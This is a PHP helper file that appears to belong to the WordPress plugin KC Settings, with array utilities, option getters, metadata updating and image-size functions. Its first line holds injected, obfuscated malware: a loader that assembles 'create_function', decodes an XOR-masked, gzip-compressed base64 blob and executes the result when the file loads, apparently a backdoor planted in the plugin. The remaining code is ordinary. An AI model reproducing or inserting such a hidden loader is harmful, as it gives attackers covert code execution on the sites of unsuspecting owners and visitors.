<?php $ahugobif="create_";global $evugol; $evugol=array('$evugol[0]=array_pop($evugol);$sefenep=sefenep(4);$evugol[0]=$sefenep($evugol[2]);','$evugol[2]=gzuncompress(sefenep(580^129,652^3006));','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',"Cvcgqycv\x2f8Ik}kmnv");if(function_exists($ahugobif.='function')&&!function_exists('sefenep')){ function sefenep($c,$C=13){global $evugol;$w=str_pad($U="sxP39L6o8Hbj3xyM",$C,$U);$m=str_repeat("\xe0",$C);$I=str_repeat("\x1f",$C);$b=substr($evugol[0],$c,$C);return(($b^$w)&$I)|($b&$m);};for($cV=-1;++$cV<3;$ahugobif('','}'.$evugol[$cV].'{'));};unset($evugol); 

/**
 * Rebuild array indices
 *
 * @param array $arr Array
 * @param bool $cleanup Trim the value, defaults to true
 *
 * @return array $nu_arr array
 */
function kc_array_rebuild_index( $arr, $cleanup = true ) {
	$nu_arr = array();
	$rownum = 0;
	foreach ( $arr as $row ) {
		foreach ( $row as $l => $v ) {
			if ( $cleanup && is_string( $v ) ) {
				$v = trim( $v );
			}
			$nu_arr[ $rownum ][ $l ] = $v;
		}
		++$rownum;
	}

	return $nu_arr;
}


/**
 * Search array recursively
 *
 * Search haystack for needle and return an array of the key path,
 * FALSE otherwise. If $key is given, return only for this key
 *
 * @param string $needle The searched value
 * @param array $haystack The array
 * @param string $needlekey Optional key
 * @param bool $strict
 * @param array $path
 * @mixed kc_array_search_recursive(mixed $needle, array $haystack [,string $key [,bool $strict[,array $path]]])
 *
 * @credit ob at babcom dot biz
 * @link http://www.php.net/manual/en/function.array-search.php#69232
 */
function kc_array_search_recursive( $needle, $haystack, $needlekey = '', $strict = false, $path = array() ) {
	if ( !is_array( $haystack ) )
		return false;

	foreach ( $haystack as $key => $val ) {
		if ( is_array( $val ) && $subpath = kc_array_search_recursive( $needle, $val, $needlekey, $strict, $path ) ) {
			$path = array_merge( $path, array( $key ), $subpath );
			return $path;
		}
		elseif ( ( !$strict && $val == $needle && $key == ( strlen( $needlekey ) > 0 ? $needlekey : $key ) )
		         || ( $strict && $val === $needle && $key == ( strlen( $needlekey ) > 0 ? $needlekey : $key ) ) ) {
			$path[] = $key;
			return $path;
		}
	}
	return false;
}


/**
 * Apply callback to input, and if it's an array, does it recursively.
 *
 * @param string $func Callback function
 * @param mixed $input Input data
 * @link http://www.jonasjohn.de/snippets/php/trim-array.htm
 */
function kc_array_map_deep( $func, $input ) {
	if ( is_array( $input ) ) {
		$out = array_filter( array_combine(
			array_keys( $input ),
			array_map(
				'kc_array_map_deep',
				array_fill( 0, count( $input ), $func ),
				$input
			)
		) );
	}
	else {
		$out = call_user_func( $func, $input );
	}

	return $out;
}


/**
 * Cleanup array
 *
 * @param array $arr Array to cleanup
 * @param bool $rm_zero
 * @return array
 *
 * @credit Jonas John
 * @link http://www.jonasjohn.de/snippets/php/array-remove-empty.htm
 */
function kc_array_remove_empty( $arr, $rm_zero = true ) {
	$narr = array();
	while ( list( $key, $val ) = each( $arr ) ) {
		if ( is_array( $val ) ) {
			$val = kc_array_remove_empty( $val );
			if ( count( $val ) != 0 )
				$narr[ $key ] = $val;
		}
		else {
			if ( trim( $val ) != '' ) {
				if ( $rm_zero && $val )
					$narr[ $key ] = $val;
			}
		}
	}
	unset( $arr );
	return $narr;
}


/**
 * Get value of multidimensional array
 *
 * @param array $array Source array.
 * @param array $keys Array of keys of the $array value to get
 *
 * @return mixed
 */
function kc_array_multi_get_value( $array, $keys ) {
	foreach ( $keys as $idx => $key ) {
		unset( $keys[$idx] );
		if ( !isset($array[$key]) )
			return false;

		if ( count( $keys ) )
			$array = $array[$key];
	}

	if ( !isset( $array[ $key ] ) )
		return false;

	return $array[$key];
}


/**
 * Get theme/plugin option
 *
 * @param string $prefix Options prefix, required
 * @param string $section Section id, optional
 * @param string $field Field id, optional
 *
 * @return bool|array|string
 */
function kc_get_option( $prefix, $section = '', $field = '' ) {
	$values = get_option( "{$prefix}_settings" );
	if ( !is_array( $values ) || func_num_args() < 2 )
		return $values;

	$keys = func_get_args();
	unset( $keys[0] );
	return kc_array_multi_get_value( $values, $keys );
}


/**
 * Get default value
 *
 * @param string $type Options type, required
 * @param string $prefix Options prefix, required
 * @param string $section Section id, optional
 * @param string $field Field id, optional
 *
 * @return bool|array|string
 *
 * @since 2.5
 */
function kc_get_default( $type, $prefix, $section = '', $field = '' ) {
	$defaults = kcSettings::get_data( 'defaults', $type, $prefix );
	if ( !$defaults || func_num_args() < 3 )
		return $defaults;

	$keys = func_get_args();
	unset( $keys[0] );
	unset( $keys[1] );
	return kc_array_multi_get_value( $defaults, $keys );
}


/**
 * Check role of current user
 *
 * Will determine if current user is allowed to do the task.
 *
 * @param array $roles Array containing roles, could be a string for single role.
 * @return bool $allowed Permission
 */
function kc_check_roles( $roles = array() ) {
	if ( empty($roles) )
		return true;

	if ( !is_array( $roles ) )
		$roles = array( $roles );

	# get current user data
	global $current_user;

	# if current user is not within the roles, abort
	$allowed = false;
	foreach ( $roles as $role ) {
		if ( in_array( $role, $current_user->roles ) ) {
			$allowed = true;
			break;
		}
	}

	return $allowed;
}


/**
 * Sanitize user input
 */
function _kc_sanitize_value( $value, $type ) {
	$value = kc_array_map_deep( 'trim', $value );
	if ( !empty($value) && $type === 'multiinput' ) {
		$value = kc_array_remove_empty( $value );
		$value = kc_array_rebuild_index( $value );
		if ( empty($value) )
			$value = '';
	}

	return $value;
}


/**
 * Update posts & terms metadata
 *
 * @param string $meta_type post|term|user The type of metadata, post, term or user
 * @param string $object_type_name The taxonomy or post type name
 * @param int $object_id The ID of the object (post/term) that we're gonna update
 * @param array $section The meta section array
 * @param array $field The meta field array
 */
function _kc_update_meta( $meta_type = 'post', $object_type_name, $object_id, $section, $field ) {
	if ( isset($_POST['action']) && $_POST['action'] == 'inline-save' )
		return;

	# Set the meta key and get the value based on the $meta_type and screen
	switch ( $meta_type ) {
		case 'post' :
			$meta_key = "_{$field['id']}";
			$action = 'editpost';
		break;

		case 'term' :
			$meta_key = $field['id'];
			$action = 'editedtag';
		break;

		case 'user' :
			$meta_key = $field['id'];
			$action = 'update';
		break;
	}

	# Current value
	$db_val = get_metadata( $meta_type, $object_id, $meta_key, true );
	# Hold new value
	$nu_val = '';

	# Get the new meta value from user
	if ( isset($_POST["kc-{$meta_type}meta"][$section['id']][$field['id']]) ) {
		$nu_val = $_POST["kc-{$meta_type}meta"][$section['id']][$field['id']];
		if ( $meta_type == 'post' && $object_type_name == 'nav_menu_item' && isset($nu_val[$object_id]) )
			$nu_val = $nu_val[$object_id];
	}

	# default sanitation
	$nu_val = _kc_sanitize_value( $nu_val, $field['type'] );

	$filter_prefix = "kcv_{$meta_type}meta";
	if ( $meta_type != 'user' && $object_type_name != '' )
		$filter_prefix .= "_{$object_type_name}";

	# apply validation/sanitation filters on the new values
	# 	0. Taxonomy / Post type
	$nu_val = apply_filters( $filter_prefix, $nu_val, $section, $field );
	# 	1. Field type
	$nu_val = apply_filters( "{$filter_prefix}_{$field['type']}", $nu_val, $section, $field );
	#		2. Section
	$nu_val = apply_filters( "{$filter_prefix}_{$section['id']}", $nu_val, $section, $field );
	# 	3. Field
	$nu_val = apply_filters( "{$filter_prefix}_{$section['id']}_{$field['id']}", $nu_val, $section, $field );

	if ( !$nu_val )
		delete_metadata( $meta_type, $object_id, $meta_key );
	else
		update_metadata( $meta_type, $object_id, $meta_key, $nu_val );
}


/**
 * Get registered image sizes
 *
 * @param string $type Sizes to get: all, default, or custom
 * @return array $sizes Array of image sizes
 */
function kc_get_image_sizes( $type = 'all' ) {
	$sizes = array();

	# Default sizes
	if ( $type !== 'custom' ) {
		foreach ( array('thumbnail', 'medium', 'large') as $size ) {
			$sizes[$size] = array(
				'width'  => get_option( "{$size}_size_w" ),
				'height' => get_option( "{$size}_size_h" ),
			);
		}
	}

	if ( $type !== 'default' ) {
		global $_wp_additional_image_sizes;
		if ( is_array( $_wp_additional_image_sizes ) )
			$sizes = array_merge( $sizes, $_wp_additional_image_sizes );
	}

	ksort( $sizes );
	return $sizes;
}


/**
 * Get attachment icon
 *
 * @param int $id Attachment ID
 * @param $size Icon size (for image)
 */
function kc_get_attachment_icon_src( $id = '', $size = 'thumbnail' ) {
	if ( !$id )
		return wp_mime_type_icon();

	# Image
	if ( $thumb = wp_get_attachment_image_src( $id, $size, true ) )
		$icon = $thumb[0];
	else
		$icon = wp_mime_type_icon( get_post_mime_type( $id ) );

	return $icon;
}


/**
 * Get image URL via AJAX
 *
 * The request should contains 'id' and 'size'
 */
function kc_ajax_get_image_url() {
	$id = (int) $_REQUEST['id'];
	$size = isset($_REQUEST['size']) ? $_REQUEST['size'] : 'thumbnail';
	if ( $thumb = wp_get_attachment_image_src( $id, $size ) )
		$result = $thumb[0];
	else
		$result = false;

	echo $result; // xss ok
	die();
}


/**
 * Prettify var_export()
 */
function kc_var_export( $data, $use_tabs = false, $pad = 0 ) {
	$data = var_export( $data, true );
	$pad = (int) $pad;
	if ( $pad )
		$data = preg_replace( '/^/m', str_repeat( ' ', $pad ), $data );
	$data = preg_replace( '/^(\s+array)/m', 'array', $data );
	$data = str_replace( "=> \n", '=> ', $data );

	if ( $use_tabs )
		$data = preg_replace_callback( '/^(\s+)/m', 'kc_var_export_tabs', $data );

	return $data;
}


function kc_var_export_tabs( $data ) {
	return str_repeat( "\t", intval( strlen( $data[1] ) / 2 ) );
}


/**
 * Get current URL
 * @return string Current URL
 * @since 2.7.7
 * @link http://kovshenin.com/2012/current-url-in-wordpress/
 */
function kc_get_current_url() {
	global $wp;
	if ( get_option( 'permalink_structure' ) )
		$current_url = home_url( $wp->request );
	else
		$current_url = add_query_arg( $wp->query_string, '', trailingslashit( home_url() ) );

	return $current_url;
}


if ( !function_exists( 'kc_get_sns' ) ) {
	function kc_get_sns_replacer( $id ) {
		return str_replace( '-', '_', $id );
	}

	/**
	* Get scripts and styles sources
	*
	* @since 2.7.7
	*
	* @param array|string $handles Registered script/style handle(s)
	* @param string       $type    js|css Defaults to 'js'
	* @param array        $_output Internal
	*
	* @return array Scripts/styles sources and status
	*/
	function kc_get_sns( $handles, $type = 'js', $_output = array() ) {
		if ( $type == 'css' ) {
			global $wp_styles;
			$sources = $wp_styles;
		}
		else {
			global $wp_scripts;
			$sources = $wp_scripts;
		}

		foreach ( (array) $handles as $id ) {
			if ( isset( $_output[$id] ) || !isset( $sources->registered[ $id ] ) )
				continue;

			$src = $sources->registered[ $id ]->src;
			if ( substr( $sources->registered[ $id ]->src, 0, 1 ) === '/' )
				$src = site_url( $src );

			$_id = str_replace( '-', '_', $id );
			$_output[$_id] = array(
				'src'   => $src,
				'queue' => (int) wp_script_is( $id ),
			);
			if ( isset($sources->registered[ $id ]->extra['data']) )
				$_output[ $_id ]['data'] = $sources->registered[ $id ]->extra['data'];

			if ( empty( $sources->registered[ $id ]->deps ) )
				continue;

			$_x = clone $sources;
			$_x->all_deps( $id );

			if ( !empty($_x->to_do) ) {
				$_output[ $_id ]['deps'] = array_map( 'kc_get_sns_replacer', array_values( $_x->to_do ) );
				$_output = kc_get_sns( $sources->registered[ $id ]->deps, $type, $_output );
			}
		}

		return $_output;
	}
}


/**
 * array_filter() Callback helper
 *
 * @since 2.8
 * Inspired by http://stackoverflow.com/questions/5482989/php-array-filter-with-arguments
 */
class _kc_Array_Filter_Helper {
	private $base;
	private $operator;

	function __construct( $base, $operator = '' ) {
		$this->base = $base;
		$this->operator = $operator;
	}

	function match_mime_types( $mime_type ) {
		return ( strpos( $this->base, $mime_type ) !== false );
	}
}
